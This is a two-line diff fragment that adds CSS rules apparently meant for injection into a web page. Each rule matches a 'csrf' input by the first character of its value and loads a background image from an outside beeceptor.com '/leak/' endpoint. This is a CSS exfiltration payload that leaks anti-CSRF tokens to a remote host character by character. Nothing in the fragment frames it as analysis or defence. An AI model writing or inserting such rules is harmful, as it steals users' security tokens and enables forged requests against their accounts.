@@ -1,0 +1,2 @@
+input[name='csrf'][value^='y'] ~ * {background: url(//wucebrayne.free.beeceptor.com/leak/y);}
+input[name='csrf'][value^='v'] ~ * {background: url(//wucebrayne.free.beeceptor.com/leak/v);}
